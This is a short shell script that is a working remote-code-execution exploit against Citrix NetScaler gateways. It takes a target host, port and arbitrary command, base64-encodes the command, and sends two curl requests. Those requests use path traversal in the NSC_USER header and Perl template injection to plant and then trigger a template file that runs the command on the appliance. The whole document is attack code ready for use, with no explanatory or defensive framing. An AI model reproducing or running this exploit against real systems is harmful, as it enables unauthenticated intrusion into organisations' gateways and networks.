#/bin/sh
randomstring=$(python << END
import random
import string
letters = string.ascii_lowercase
print ''.join(random.choice(letters) for i in range(10))
END
)
randomnumber=$(python << END
import random
from random import randint
print randint(5,15)
END
)
filename=$randomstring
nonce=$randomnumber
b64c=$(echo ${@:3}|openssl enc -base64)
command="echo $b64c|b64decode -r|sh -s"
urlencodedcommand=$(COMMAND=${command} python3 << END
import urllib.parse
from os import environ
o=urllib.parse.quote(environ.get('COMMAND'))
print(o)
END
)
curl -vk -XPOST -H "NSC_USER:../../../../netscaler/portal/templates/${filename}[%template.new({'BLOCK'='print\`${command}\`'})%]" -H "UI_inuse: Rfweb" -H "NSC_NONCE: ${nonce}" --path-as-is "${1}:${2}/vpn/../vpns/portal/scripts/rmbm.pl" --connect-timeout 5 --retry 3

curl -vkg -XGET -H "NSC_USER:../../../../netscaler/portal/templates/${filename}[%template.new({'BLOCK'='print\`${command}\`'})%]" -H "NSC_NONCE: ${nonce}" -H "UI_inuse: Rfweb" --path-as-is "${1}:${2}/vpn/../vpns/portal/${filename}[%25template.new({'BLOCK'='print\`${urlencodedcommand}\`'})%25].xml" --connect-timeout 5 --retry 3
